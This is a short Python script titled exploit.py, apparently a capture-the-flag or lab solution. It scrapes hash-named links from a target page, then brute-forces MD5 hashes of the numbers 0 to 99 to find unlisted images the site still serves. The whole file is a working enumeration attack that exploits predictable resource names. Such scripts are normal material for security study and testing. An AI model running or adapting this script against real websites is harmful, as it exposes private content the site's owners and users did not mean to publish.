#!/usr/bin/env python3

import hashlib
import requests
import re
import sys

if len(sys.argv) != 2:
    print("[*] python3 exploit.py <URL>")
    sys.exit(1)

def main():
    url = sys.argv[1]
    print("[+] Retriving all the hashes present in the page")
    hashes = requests.get(f"{url}/").text
    collection = re.findall('" href="(.*?)" coords="', hashes, re.DOTALL)
    known = collection[1:]
    print("[+] Generating MD5 hashes")
    for i in range(0,100):
        number = str(i).encode()
        created_hash = hashlib.md5(number).hexdigest()
        if created_hash not in collection:
            image = requests.get(f"{url}/{created_hash}")
            if image.status_code != 404:
                print(f"[+] We've found a new image here's the hash: {created_hash}")
        else:
            print("[-] skipping hash already in collection")

if __name__ == ("__main__"):
    main()
